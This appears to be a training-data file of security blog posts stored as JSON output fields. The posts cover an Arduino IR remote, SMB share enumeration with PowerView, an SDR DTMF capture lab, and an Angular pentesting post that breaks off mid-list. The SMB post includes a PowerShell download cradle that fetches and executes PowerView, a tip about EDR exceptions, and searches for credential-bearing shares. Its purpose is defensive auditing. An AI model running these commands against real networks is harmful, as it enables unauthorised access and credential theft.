LOW); // close relay ch-3\n if (CH_3 == true) digitalWrite(mute, HIGH); // open relay ch-3\n CH_3 = !CH_3;\n break;\n\n case 0xff22dd: //Play\n Serial.println(\"Play\");\n if (CH_4 == false) digitalWrite(play, LOW); // close relay ch-4\n if (CH_4 == true) digitalWrite(play, HIGH); // open relay ch-4\n CH_4 = !CH_4;\n break;\n }\n myReceiver.enableIRIn(); //Restart the receiver\n }\n }\n }\n\nTypical run of Arduino generic remote button presses \n\nConclusion \n\nFor me, this was an enjoyable project from the very beginning and although Infrared communication has been around for quite some time, it's nice to know that we have open source tools available to help us with our research.    \n\nAdditionally, it was interesting to learn that the Infrared wavelength is just outside of the visible light spectrum and invisible to the naked eye. I recently discovered that a team of researchers used this information as a means to exfiltrate and infiltrate proprietary data on an air-gap security camera network. https://arxiv.org/abs/1709.05742 \n\nUsing malware installed internally on the network they managed to establish bi-directional covert communication between the internal network of organizations and remote attackers by controlling (pulsating) the IR illumination. The researchers indicated that they were able to exfil PIN codes, passwords, and encryption keys at a rate of 20 bits/sec and infil data into the network at a rate of 100 bits/sec. They went on to say that binary data such as command and control (C2)  and beacon messages were encoded on top of the IR signals. \n\nUltimately, I found that it was quite easy to configure hardware to harness the power of Infrared and control relays with a push of a button. The benefits of Infrared hardware control are practically limitless, limited only by the imagination of the hardware designer.    \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Finding Buried Treasure in Server Message Block (SMB)\"\nTaxonomies: \"Author, David Fletcher, Informational\"\nCreation Date: \"Mon, 19 Apr 2021 18:45:35 +0000\"\nDavid Fletcher //\n\nService Message Block (SMB) shares can represent a significant risk to an organization. Companies often lack a realistic understanding of the exposure that SMB shares represent. Effective management typically requires a sound information management program focused on identifying where critical information resides, actively controlling access to that information, and routinely auditing permissions and access patterns. \n\nOften, when organizations are asked about discovery of sensitive data, administrators immediately indicate that mapped network drives are routinely audited for sensitive content and that permissions on those drives are rigorously guarded. \n\nUnfortunately, mapped network drives are typically the tip of the iceberg when it comes to content exposure on any given network. In this post, we will walk through one method to identify potentially sensitive content exposure via SMB shares at scale. At the end of the post, strategies for reducing the amount of exposure present in an environment will be presented. \n\nContent Discovery at Scale \n\nA favorite tool for SMB enumeration is the PowerSploit PowerView script. It has been ported to other languages and much of its functionality serves as the basis for the BloodHound project. Two functions are most valuable for performing discovery on a Windows Active Directory (AD) network. The first, Get-NetComputer, is used to collect target computer names so we can create triage lists for analysis of our network shares. The second, Invoke-ShareFinder, actually does the enumeration for us, dutifully asking each computer for a list of shares and checking to see if our selected user has access. \n\nWhen performing this activity, it is useful to start with a user account that is a member of the \u2018Domain Users\u2019 group only. This will reduce the false positive rate on share exposure and identify the most egregious cases where the share is exposed to everyone on the domain. After identifying and mitigating worst cases, additional group memberships can be added to simulate what information is exposed to a typical user. \n\nTriage Computer List Creation \n\nWhen assessing share content, I normally generate triage computer lists so I know exactly what I am looking at, what potential value it has for attack, and so I can potentially avoid pitfalls like honeypots that have incomplete Active Directory attribute information. This strategy also works from a defensive perspective. Generally, in modern Windows networks, more content is shared on data center resources than on workstation segments, enumeration of the data center resources may not appear anomalous, and older operating systems (like Windows Server 2003, Windows Server 2008, and Windows Server 2012 RTM) represent increased risk to the environment.  \n\nAs an example, all of these operating systems have one characteristic in common, WDigest is enabled and that means potential for cleartext credentials in memory. Other issues like lack of support from Microsoft (Windows Server 2003 and Windows Server 2008) and age in the environment (it may be easier to escalate privileges due to configuration drift) also make them attractive from an attack perspective. As a defender, it is probably a good idea to address these hosts first. \n\nTo a lesser extent, the issues described above also exist in the workstation segment. However, we generally find administrative access in those environments more than sensitive content. Obviously, that is not a hard and fast rule, as one environment can differ significantly from another. \n\nIn order to generate the triage lists described above, we need to get our hands on PowerSploit PowerView or SharpView. Commands shown below are for PowerView 2.0 but they can be adapted to work with PowerView 3.0 and SharpView. I personally prefer PowerView 2.0 syntax, but similar analysis can be accomplished using Get-DomainComputer and Find-DomainShare in PowerView 3.0. \n\nYou may need to create an exception in your endpoint suite or Endpoint Detection and Response (EDR) tool for retrieval and execution to be successful. The script can be retrieved using a PowerShell download cradle, downloaded directly to disk, or copied and pasted (in raw form) into the PowerShell interpreter window or PowerShell Integrated Scripting Environment (ISE). The following commands will generate triage lists for all typical Windows operating systems. Remove the ones that do not exist in your environment. \n\nPS C:\\> iex(iwr \u201chttps://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u201d -usebasicparsing) \nPS C:\\> Get-NetComputer \u2013OperatingSystem *2003* | Out-File \u2013Encoding ASCII Windows2003Hosts.txt \nPS C:\\> Get-NetComputer \u2013OperatingSystem *2008* | Out-File \u2013Encoding ASCII Windows2008Hosts.txt \nPS C:\\> Get-NetComputer \u2013OperatingSystem *2012* | Out-File \u2013Encoding ASCII Windows2012Hosts.txt \nPS C:\\> Get-NetComputer \u2013OperatingSystem *2016* | Out-File \u2013Encoding ASCII Windows2016Hosts.txt \nPS C:\\> Get-NetComputer \u2013OperatingSystem *2019* | Out-File \u2013Encoding ASCII Windows2019Hosts.txt \nPS C:\\> Get-NetComputer \u2013OperatingSystem *XP* | Out-File \u2013Encoding ASCII WindowsXPHosts.txt \nPS C:\\> Get-NetComputer \u2013OperatingSystem *7* | Out-File \u2013Encoding ASCII Windows7Hosts.txt \nPS C:\\> Get-NetComputer \u2013OperatingSystem * 8* | Out-File \u2013Encoding ASCII Windows8Hosts.txt \nPS C:\\> Get-NetComputer \u2013OperatingSystem *10* | Out-File \u2013Encoding ASCII Windows10Hosts.txt \n\nIf you have poor Active Directory hygiene (computer accounts exist for devices that no longer exist), it can be useful to also filter on the pwdLastSet attribute to remove devices with a high likelihood of being unresponsive. By default, in Active Directory, computers reset the password associated with their account every 30 days. Usually, I provide a grace period of about 6 months in customer environments for devices. Typically, this is not necessary unless you aim to try to avoid detection. Full enumeration is also likely to produce complete results (unless a device is turned off at the time of the activity.) \n\nShare Enumeration \n\nNext, the triage lists generated above are used as input for the Invoke-ShareFinder function. Invoke-ShareFinder simply requests a share listing from each asset in the list and, as we will configure it, will check to see if the identity we are using has access to the exposed shares. Commands for each triage list are shown below. The only variations are the actual input list and output file name. \n\nPS C:\\> Invoke-ShareFinder \u2013ComputerFile Windows2003Hosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII Windows2003Shares.txt \nPS C:\\> Invoke-ShareFinder \u2013ComputerFile Windows2008Hosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII Windows2008Shares.txt \nPS C:\\> Invoke-ShareFinder \u2013ComputerFile Windows2012Hosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII Windows2012Shares.txt \nPS C:\\> Invoke-ShareFinder \u2013ComputerFile Windows2016Hosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII Windows2016Shares.txt \nPS C:\\> Invoke-ShareFinder \u2013ComputerFile Windows2019Hosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII Windows2019Shares.txt \nPS C:\\> Invoke-ShareFinder \u2013ComputerFile WindowsXPHosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII WindowsXPShares.txt \nPS C:\\> Invoke-ShareFinder \u2013ComputerFile Windows7Hosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII Windows7Shares.txt \nPS C:\\> Invoke-ShareFinder \u2013ComputerFile Windows8Hosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII Windows8Shares.txt \nPS C:\\> Invoke-ShareFinder \u2013ComputerFile Windows10Hosts.txt -NoPing \u2013ExcludeIPC \u2013ExcludePrint \u2013CheckShareAccess | Out-File \u2013Encoding ASCII Windows10Shares.txt \n\nIf you have a large environment, the above commands can be executed faster by adding the \u2018threads\u2019 parameter to the Invoke-ShareFinder portion of the command. Doing so allows the script to evaluate the elements of the computer listing in parallel fashion. The resulting output files, generated above, will serve as the source for our sensitive content discovery operation, described in the next section. \n\nSensitive Content Discovery \n\nWith our share lists generated, it\u2019s time to find that buried treasure!!! \n\nOn a test, I would typically generate a single list at a time and search through the results individually to identify what a group of hosts running the same operating system might expose. However, for defensive purposes, it is useful to investigate the shares at scale. This can be most effectively accomplished using a tool that understands regular expressions and multi-file searching. Some of my favorite searches are demonstrated below using the Notepad++ text editor. Similar analysis can be accomplished in Linux using the cat, sort, and grep utilities. \n\nFirst, select all of the files containing share information, right click, and select \u201cEdit with Notepad++\u201d. \n\nWith all of the files open simultaneously, we will investigate some common exposures that pose risk to the organization. It\u2019s likely that in a given environment, many more cases will be present. However, the analysis below simply serves to illustrate latent risk due to SMB share exposure.  \n\nAdministrative Access \n\nProbably the most notorious and useful shares that can be exposed in the context of an attack are the \u201cC$\u201d and \u201cAdmin$\u201d shares. Discovery of these shares means that administrative access is extremely likely. To discover these shares, we can use the normal mode search feature in Notepad++ as shown below. Select the Search > Find... menu option or Ctrl+F to display this dialog. \n\nEnter the text \u201cAdmin$\u201d in the search bar, select the normal search mode, and click the \u201cFind All in All Opened Documents\u201d button. \n\nThe Notepad++ search results pane will identify all discovered instances across the group of open files. This situation can be a windfall for an attacker. Credential dumping via the registry or LSASS process may be possible. \n\nDeployment Shares \n\nAnother favorite target is deployment shares. System Center Configuration Manager (SCCM), Windows Deployment Services (WDS), and the Microsoft Deployment Toolkit (MDT) are used to deploy new operating systems on the network in an automated fashion.  \n\nWith the Find dialog open, enter the keyword \u2018REMINST\u2019, using normal search mode, and click the \u201cFind All in All Opened Documents\u201d button. \n\nWhen folders in the shares exposed on these hosts are poorly protected, unattend.xml files and Windows Image (.wim) files may be accessible. Analysis on these resources often lead to discovery of valid local or domain credentials. \n\nRoot Filesystem Shares \n\nAdministrators may share an entire drive on a given host. When this occurs, all of the accessible content on the drive is exposed to anyone with access to the share. Typically, the only locations that have significant restrictions with regard to read access, are the subfolders of the \u2018C:\\Users\u2019 directory. By default, the system folder (C:\\Windows), program files, and any other folders created in the root folder (C:\\) can be inspected. \n\nWith the Find dialog open, enter the regular expression \u2018\\\\[a-zA-Z] \u2019, using regular expression search mode, and click the \u201cFind All in All Opened Documents\u201d button. The regular expression above matches text that includes a backslash (two backslashes are used to escape the sequence) followed by a single letter (the text within the brackets is a character class definition set to match lower and upper-case alpha characters), followed by a space.\n\nAll of the shares listed in the search results are worth investigation. Older operating systems might have exposed unattend.xml files with credentials in them and root shares on servers might have very interesting content. In the above, why would a domain controller, SQL server, IT utility server, and file server containing home directories have the root of a drive shared out? Configuration files, scripts, and other content in these locations are likely to expose credentials. \n\nApplication/Web Root Shares \n\nApplication developers often use SMB shares to publish changes to projects across the network. When those shares are not properly restricted, users on the network have access to browse source code of the application, at a minimum. \n\nWith the Find dialog open, enter the regular expression \u2018inetpub|wwwr|web\u2019, using regular expression search mode, and click the \u201cFind All in All Opened Documents\u201d button. The regular expression above serves as a multiple keyword search operation with the selected keywords separated by the pipe character (notice, no spaces between). \n\nShares that include custom application or web application source code are a serious issue. Where read access is possible, an attacker can investigate source code for programming issues, check configuration files for credentials, and is likely to have SQL access somewhere on the network as a result. \n\nWhere write access is possible, the situation gets much worse. If project files and source code are staged on the target share, an attacker can embed malicious code in the project file or source code of the application. When the project gets built or executed, the attacker gains access to the hosting server (or wherever the project is being built). On an application server, the attacker can also deploy malicious functionality, embedded in or disguised as legitimate functionality of the application. The Laudanum project is still one of my favorite web shells and is useful for executing commands in the context of the web application service account. \n\n\u201cBackup\u201d Shares \n\nBackup shares are commonly observed in a target environment. Sometimes these shares are found to expose full digital backup storage. However, more commonly, the shares appear to be used by administrators to migrate databases and other resources to new platforms. \n\nFor this share, we return to normal search mode, enter the keyword \u2018Backup\u2019, and click the \u201cFind All in All Opened Documents\u201d button. \n\nBackup shares can contain exceptionally dangerous content. Typically, in my experience, most of these shares contain backups for common SQL server implementations. However, on occasion, we discover some extremely interesting content.  \n\nThe share on the \u2018VMWare\u2019 host is likely to contain Virtual Machine Disk (VMDK) files; potentially including those for domain controllers. VMDK files can be analyzed with tools like 7-zip without the need to actually install the software on a host. Even if the VMDK file for a domain controller is several years old, it is likely to include many valid and useful credentials. Consider the following questions as evidence that useful credentials would exist: \n\nHave you ever rotated passwords on the krbtgt account in your domain(s)?  \n\nHow old is the password on your oldest service account?  \n\nAre there any LM hashes still present in the Active Directory database? \n\nBelieve it or not, we have found and exploited these conditions on several engagements. \n\nTreasures Abound!! \n\nThe conditions presented above are only the tip of the iceberg. In your own environment, I\u2019m sure that other opportunities will present themselves. Off the top of my head, I can think of a dozen additional searches that I like to conduct. However, the point of the exercise is not to comprehensively identify all the bad things we can find on SMB shares. It\u2019s to get you thinking about what is being shared on your network and strategies you can used to mitigate the associated risk. \n\nMitigation Strategies \n\nShare Minimization \n\nAdministrators should review the list of shares to determine whether any given SMB share is necessary and appropriate given the context of the observed access. Any shares found to be unneeded should be disabled. Remaining shares should have permissions adjusted to address principle of least privilege and need to know requirements. \n\nPermission Adjustment \n\nSMB shares incorporate two sets of permissions. The first is the actual NTFS permissions applied to the shared folder. The second are the share permissions assigned to the share itself. When a user browses to an SMB share, the server applies the most restrictive intersection of those two sets of permissions. \n\nWhere NTFS permissions are concerned, when an administrator does not make deliberate changes, the local \u2018Users\u2019 group on the system will have read access to all volumes. By default, on domain joined computers, the \u2018Domain Users\u2019 group is a member of the local \u2018Users\u2019 group. This means that any authenticated user can read the filesystem in a volume where those permissions are not changed. \n\nWith share permissions, unless the administrator explicitly creates the share and assigns a domain group as having permission to access the share, the default permissions are for the \u2018Everyone\u2019 group to have read access. \n\nAs you can probably already tell, shares created with default conditions in both cases, will typically allow any authenticated member of the \u2018Domain Users\u2019 group to read content on the share. \n\nThe second strategy is to correct these permissions across the breadth of shares identified by our earlier work. This can be a monumental undertaking depending on the scope and scale of the network under consideration.  \n\nSegmentation \n\nSegmentation is simply subdividing the target network into more manageable, and functional, chunks to ease the burden of administration. A segmentation project should always have the principal of least privilege and need to know (or access) concepts in mind during the design phase. The end goal is to create choke points on the network where only authorized individuals (or computers) and protocols are able to pass between network segments based on a functional need. As such, true segmentation always implies that appropriate Access Control Lists (ACLs) are implemented between segments. \n\nOn user segments, this strategy should be taken a step further to prevent workstation to workstation communication. On a Windows Active Directory (AD) network, workstation to workstation communication should be considered anomalous. Often, an attacker can exploit lateral communication within a workstation segment to accumulate privileges on route to full environmental takeover. By preventing this communication, the attacker is forced to directly attack data center (or other accessible) elements of the network. \n\nIn addition, the user segment should have the minimum access necessary into the data center (or other protected segments) and no more. Standard user workstations should not be able to directly access critical resources on the network using unauthorized protocols. For example, a standard user workstation should not be able to initiate an RDP session to a server (especially a Domain Controller). Web management consoles like VSphere, VEEAM, and other core services should equally not be accessible. \n\nAdministrators should have a dedicated workspace for their administrative accounts (physical workstation, jump host, VDI) that has no access to email or the internet. The administrative network segment should allow access to necessary resources that are restricted on workstation segments. \n\nImplementation of the general guidelines above would make access to superfluous network shares impossible from the user workstation segment. Many options for effective segmentation exist including: \n\nNetwork-based firewalls \n\nHost-based firewalls \n\nNetwork infrastructure \n\nA simplified diagram of illustrating the described conditions is shown below. \n\nUser and Entity Behavioral Analytics (UEBA) \n\nUEBA does not directly mitigate exposure associated with SMB shares like the previous examples. However, it can be used to proactively identify when user activity deviates from an established baseline.  \n\nWhen a significant deviation occurs, an alert is generated to the information security team so an investigation into the activity can be initiated. A significant deviation is often defined in terms of thresholds in the UEBA platform. In our case, if a user interacts with computers or browses to more than 30 shares that have not been observed in the past 30 days, the alert condition is tripped. \n\nUEBA is not foolproof. An attacker with persistent access may be able to fly below the radar by slowly expanding the population of hosts or shares that appear normal to the UEBA solution. The attacker would likely need evidence that UEBA is in place to take this action.  \n\nThe attacker can also perform manual analysis to identify hosts that might be more valuable for sensitive data discovery. Contextual clues often appear in hostnames, groups assigned to users, descriptions on objects in Active Directory, and other locations that will aid the attacker in formulating a pecking order for resource analysis in the environment. \n\nAdditional Assurance \n\nAfter you have taken steps to eliminate unnecessary SMB shares in your environment, you might want some additional assurance that sensitive content is no longer exposed to unauthorized parties.  \n\nOne of our favorite tools for discovery of arbitrary sensitive content is Snaffler. Snaffler is capable of interrogating Active Directory to identify computer accounts, enumerating SMB shares on accessible hosts, and scouring those hosts for configurable file contents on the exposed share.  \n\nOnce you have built configuration files to support your search scenarios, the tool can be used to periodically audit the environment for new sensitive data exposure. Runtime is directly correlated with the number and depth of shares exposed. So, ensure that you use one or more of the recommended share minimization steps above before attempting discovery at scale. \n\nConclusion \n\nOrganizations cannot afford to wait on an attacker to expose the sensitive content that exists within their own environments. It is in their own best interests to take a proactive stance and eliminate the risk associated with content discovery. In most cases, the information discovered on non-standard shares should not be exposed in the first place and can provide an easier path to environmental compromise than typical Active Directory attack paths. On many occasions, we have found ourselves with administrative access to critical resources as a direct result of content discovery. \n\nNow go out and find the treasure that is hiding in your own environment!!! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Information From Thin Air: Using SDR to Extract DTMF from Radio Waves\"\nTaxonomies: \"Author, Fun & Games, Hardware Hacking, How-To, Informational, Ray Felch\"\nCreation Date: \"Tue, 04 May 2021 12:54:00 +0000\"\nRay Felch //\n\nDisclaimer \n\nWhen using an FM transmitter, do not modify the intended operation of the module by amplifying the transmitted signal. Also, be sure that attaching an FM high gain antenna will NOT be transmitting outside the legal range for RF emissions. When transmitting any data, be sure you do not accidentally break any laws by illegally transmitting on regulated frequencies. Additionally, intercepting and decrypting someone else\u2019s data is illegal, so be careful when researching your traffic. https://en.wikipedia.org/wiki/ISM_radio_band \n\nIntroduction \n\nRecently, I and a few colleagues were asked to put together a hardware lab for an upcoming Infosec conference. After some consideration, it was decided that the lab should be centered around introducing Software Defined Radio (SDR) and some of the tools available for forensic analysis of radio frequency (RF) signals. \n\nIt was also suggested that it would be beneficial to provide attendees with the hardware that we used in our lab. This would allow them to revisit the lab in the comfort of their homes, as well as use the hardware for future SDR labs and events.  \n\nThe intent here is to expose the reader to the exciting world of RF (radio frequency) wireless technologies and to provide the various tools and information to get started exploring some of the great many invisible wireless signals surrounding us everywhere we go. \n\nPreparation for the SDR lab \n\nHardware requirements: \n\nSoftware Defined Radio dongle \n\nFM transmitter module: https://www.amazon.com/gp/product/B08PVBZB8F\n\nAudio MP3 Player module:  https://www.cytron.io/c-breakout-board/p-standalone-usb-mp3-player-decoder-module \n\nMicro-SD: (any size) \n\nA good starter SDR (software defined radio) device is the RTL2832U v3 \n\nhttps://www.amazon.com/RTL-SDR-Blog-RTL2832U-Software-Defined/dp/B0129EBDS2/\n\nThis inexpensive ($25 - $30) SDR device can be tuned from 500 kHz to 1.7 GHz and has up to 3.2 MHz of instantaneous bandwidth (2.4 MHz stable). This is a receive-only USB dongle (cannot transmit). \n\nAnother inexpensive option is the NooElec-NESDR-Nano 2+. \n\nhttps://www.amazon.com/NooElec-NESDR-Nano-Ultra-Low-Compatible/dp/B01B4L48QU/\n\nThe more expensive (yet still affordable) SDR device of choice is unquestionably the HackRF One from Great Scott Gadgets. \n\nhttps://hackerwarehouse.com/\n\nhttps://www.amazon.com/HackRF-Software-Defined-ANT500-Antenna/dp/B01H3T2U7G/\n\nThis device can be tuned from 1 MHz to 6 GHz, is a half-duplex transceiver, achieves up to 20 million samples per second, using 8-bit quadrature samples (8-bit I and 8-bit Q), and is compatible with open-source GNU Radio, SDR#, and more. \n\nAlso, the HackRF is software-configurable RX and TX gain and baseband filter. \n\nHardware setup \n\nSoftware requirements: \n\nGqrx is an open-source software defined radio (SDR) receiver, with hardware support for RTL-SDR, Airspy, HackRF, BladeRF, USRP, etc., and can operate as an AM/FM/SSB receiver with audio output or as an FFT-only instrument. Gqrx is distributed as a source code package and binaries for Linux and Mac, however, many Linux distributions provide gqrx in their package repositories. (Extracted from csete/gqrx github) \n\nGqrx Install gqrx (Linux/Mac) - https://github.com/csete/gqrx\n\n(optionally) Install SDR# (Sharp) (Windows only) - https://airspy.com/download/ \n\nAudacity - https://www.audacityteam.org/download/  Audacity is a free (open-source) application you can use for recording, editing, and mixing audio. \n\nFFmpeg - https://ffmpeg.org/download.html  FFmpeg is a program designed for command-line-based processing of video and audio files (available on all platforms). \n\nScope of the lab \n\nFor this lab, we will be transmitting DTMF (dual-tone multi-frequency) tones over the air and capturing these signals using an SDR dongle and gqrx application. These distinctive tones represent the buttons pressed on the older landline telephones and should be very recognizable. To continue with our analysis of DTMF, we need a better understanding of what we are looking for (or listening to). \n\nAnalyzing the DTMF sequence \n\nThe E.161 standard is an ITU-T (International Telecommunications Union) recommendation that defines the arrangement of digits, letters, and symbols on telephone keypads and rotary dials. Button presses result in a combination of two specific frequencies, generated for gaining access to a telephone network. For example, pressing \"5\" on the dial pad results in the combination of a 1.336KHz (column) and 770Hz (row) multi-frequency tone burst. \n\nPrior to smartphones, texting was accomplished by tapping the (number) keys on the dial pad of the phone. Tapping the \"2\" key one time produced the letter \"A\", tapping the \"2\" key twice in succession produced the letter \"B\", and so on. \n\nGenerate an audio file for transmission \n\nFor purpose of this demonstration, we will encode the plain text \"sample\" to a sequence of DTMF tones.  \n\nFollowing the older convention of SMS texting, we would tap 7777 2 6 7 555 33 on the keypad.  \n\nWe can use an online site to generate a (WAV format) audio file of the sequence of DTMF tones based upon the plain text \"sample\".  https://www.audiocheck.net/audiocheck_dtmf.php \n\nFor the sake of clarity, we will rename this file \"SAMPLE-dtmf.wav\" \n\nWe can verify the contents of this WAV file using a multi-platform tool 'multimon-ng\" (successor of multimon). This is an awesome tool that supports many different demodulators. \n\ngit clone https://github.com/EliasOenal/multimon-ng.git \n\ncd multimon-ng\n\nmkdir build \n\ncd build \n\ncmake .. \n\nmake \n\nsudo make install \n\nExecute:  multimon-ng -t wav -a DTMF SAMPLE-dtmf.wav \n\nAlternatively, we can also use this open-source Linux tool to do the same. \n\ngit clone https://github.com/ribt/dtmf-decoder.git \n\ncd dtmf-decoder/ \n\nsudo python3 -m pip install -r requirements.txt --upgrade \n\nchmod +x dtmf.py \n\nsudo cp dtmf.py /usr/local/bin/dtmf \n\nExecute: dtmf  SAMPLE-dtmf.wav \n\nNow that we have created the audio file that we intend to transmit over the air, we need to store it on a micro-SD card. This card will be inserted in our audio player and played in an endless loop for transmission. \n\nPrepare the micro-SD for the audio player \n\nGeneral information \n\nFollowing the lead of a few Arduino project authors, it appears the standard for placing files on the micro-SD, is to use the following naming convention for folders and files: \n\nFolders:    001 - 099 \n\nFiles:         0001.mp3 - 0255.mp3 \n\nRename the SAMPLE-dtmf.mp3 created earlier to 0001.mp3 and copy it the micro-SD in a folder named 001. \n\nNote: I also created a short 2-second audio file of silence (0002.mp3), to provide a short delay between sequences while looping on the main audio file during testing.  You can record a short empty audio file using your favorite audio recorder and rename the file 0002.mp3.  \n\nCopy the 0002.mp3 to the same folder as the 0001.mp3 file. \n\nHardware Lab Setup \n\nInsert the micro-SD card into the Cytron Audio player module. \n\nConnect the Audio player line-out to the FM Transmitter module line-in with a 3.5mm stereo audio cable. \n\nConnect both modules to a USB power source and power up both modules. \n\nSelect the desired frequency to transmit on (preferably a quiet section of the FM spectrum to avoid interference from nearby radio stations). \n\nAt this point, we are now transmitting our DTMF audio signal over the air, at the specified frequency indicated on the FM transmitter's display. Note: You could verify the audio file is being transmitted on the selected frequency using any FM radio tuned to that frequency.  \n\nGqrx \n\nWe will be using a software defined radio application (gqrx), to capture these DTMF tones and save the resultant demodulated signal to a WAV file for later analysis. \n\nInsert SDR dongle into an available USB slot on the PC (for this demo it is assumed we are using an RTL-SDR dongle). \n\nRun gqrx -e (using the -e flag allows you to select rtl-sdr device). \n\nAdjust a few gqrx settings \n\nSelect the 'Receiver Options' tab and set the desired receive frequency (this is the frequency that your FM transmitter module is transmitting on). Also, set the Mode to \"WFM stereo\" (wide FM stereo). \n\nAdditional information: In radio engineering, a frequency offset (Receiver Options - top right corner of display) is an intentional slight shift of broadcast radio frequency (RF), to reduce interference with other transmitters. This setting can vary depending upon local RF traffic interference and can be adjusted accordingly. \n\nEnsure the FM transmitter and audio modules are running and click the \"play\" button in gqrx to begin receiving radio frequency signals. You may see many nearby signals, depending upon your location and the number of radio stations broadcasting in your area. For fun, you can play around with the receive frequency value and try tuning in to your favorite music station. Just be sure to return to the FM transmitter module frequency to continue with the lab. \n\nUpon clicking Play, you will immediately observe the 'waterfall' real-time visualization of the demodulated signal containing the audio information. In the case of an FM music station's broadcast, the audio will, of course, be music, DJ's narration, commercial advertising, etc. Regarding our hardware lab, the audio will be DTMF tones. \n\nGqrx also provides the capability to record the (demodulated) audio signal and save it to a file for later playback and analysis. This is accomplished by first selecting the \"Input Controls\" tab. With the waterfall running (Play mode), click on the REC button to begin recording. When you reach the end of your desired capture, simply click REC again to stop recording. \n\nShut off the FM transmitter / Audio module hardware. The waterfall should stop displaying the audio transmission. In the Input Controls tab, click Play. The recorded audio WAV file will play and can be heard through the PC's sound port. Notice the WAV file is saved logging the date, time, and received frequency as part of the filename. \n\nIf we open the saved gqrx WAV file in Audacity and zoom in, we can see the distinctive multi-frequency components of the DTMF bursts, \n\nFinally, we can verify our over-the-air capture of the DTMF sequence matches the transmitted audio file we generated earlier, using 'multimon-ng' \n\nExecute:  multimon-ng -t wav -a DTMF gqrx_20210423_200028_89100000.wav \n\nSynopsis \n\nUsing the FM transmitter and audio sound module presented in this post, allowed us to simulate signals that would normally have existed outside the FM spectrum. Transmitting the signal using FM radio waves allows us to experiment with software defined radio tools in a controlled environment. \n\nUsing the free and open-source tools mentioned in this write-up and the appropriate SDR hardware, analyzing demodulated signals, such as FM (frequency modulated) radio, AM (amplitude modulated) signals, DTMF signals, SSB (single sideband), LSB (lower sideband), USB (upper sideband), Bluetooth communication, garage door opener and doorbell RF frequencies, amateur (ham) radio frequencies, satellite radio and video, etc., are entirely possible. \n\nIn the future, we intend on creating more virtual hardware labs that use the hardware presented in this write-up, to capture and analyze other wireless RF protocols. Ideally, we hope to be able to provide links that allow the reader to download pre-configured WAV/MP3 files which can then be saved to the reader's micro-SD, for localized transmission over the air.  \n\nI am looking forward to being involved with this innovative and promising project! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Web App Pen Testing in an Angular Context\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Joff Thyer, Web App, Joff Thyer\"\nCreation Date: \"Thu, 06 May 2021 13:01:00 +0000\"\nJoff Thyer //\n\nIf you are a fan of web application pen testing, you have been spoiled with a lot of easy pickings over the years.  We all love our interception proxies, and I know a lot of us are huge fans of the great work that PortSwigger has done with Burp Suite over the years.  Having said this, testing apps in the age of modern web applications that have Document Object Model (DOM) focused frameworks is a little bit different than testing a traditional HTML-based app.  \n\nFor the remainder of this blog post, please make the assumption that I am referring to Angular versions 2 and up which are object-oriented and based on ECMAScript version 6 (ES6 or ECMAScript 2015). Angular version 1.x previously known as AngularJS is deprecated, and less likely to be encountered, although not dead yet! \n\nHaving said this, don\u2019t panic and don\u2019t abandon your normal web app penetration testing techniques. What you need to understand is that in the world of Angular 2+, which is designed with security in mind from the ground up, your normal opportunities specifically for injecting JavaScript into the DOM are severely limited if the developer uses the defaults and common best practices. We should celebrate that things are moving in the right direction with modern frameworks whereby developers don\u2019t have to continually reinvent the wheel! \n\nHere are a few references with some great background for you. \n\nhttps://blog.nvisium.com/angular-for-pentesters-part-1  \n\nhttps://blog.nvisium.com/angular-for-pentesters-part-2  \n\nhttps://angular.io/guide/security  \n\nThere are mistakes that developers can make which render an Angular application vulnerable from the DOM perspective. These mistakes largely boil down to developers deliberately working around the safeguards that the framework puts in place. Examples would be as follows: \n\nIf a developer combines user input with the creation of a template, then that user input can directly impact the DOM rendering leading to a template injection vulnerability. Angular considers templates as trusted by default. \n\nIf a developer decides to mark user input as trusted and disables the extremely effective Angular sanitization and output encoding methods, then you are back to the bad old days of potential Cross-Site Scripting being introduced. As a rule, any Angular interpolated content is always escaped. \n\nDirect use of the DOM APIs is discouraged! There is probably an Angular method for everything you need to do. If not, there is an Angular \u201cDomSanitize()\u201d function if you just have to muck around where you really should not. \n\nFrom an attacker perspective, a pretty sizable part of the attack surface has been removed if the developer follows the best practices. There are however opportunities to discover. Some thoughts are as follows: \n\nThe backend of the application will most likely be JSON/RESTful-based API calls. Mistakes in proper server-side data validation are possible. \n\nInsecure Direct Object References (IDOR) are discoverable in API\u2019s and you should always request multiple authenticated accounts for testing to examine cross-user role incursions. \n\nSession management still needs to be properly implemented. It is not unusual to see JSON Web Tokens (JWTs) used for session management in Angular-based apps.\n\nThe session token might not be properly invalidated upon logout, might be long-lived, or token invalidation upon log out completely in the control of the client-side DOM. \n\nThe JWT might be able to be re-signed with a \u201cNone\u201d value as the signature algorithm creating an unsecured token, or the signing key itself might be able to be cracked.  \n\nSigning your own application JWT could lead to other authenticated user compromise.  \n\nFor a couple of quick JWT references visit these URLs:\n\nhttps://jwt.io/  \n\nhttps://en.wikipedia.org/wiki/JSON_Web_Token  \n\nUndocumented or debugging API functionality might be discovered through changing a value in the browser DOM. \n\nIf a developer decides to implement Server-Side Rendering (SSR) rather than the normal DOM heavy Client-Side Rendering (CSR), it is possible to reintroduce JavaScript injection opportunities. The Angular project is trying to get ahead of this by introducing Angular Universal. Here are a couple of references for you.\n\nhttps://angular.io/guide/universal  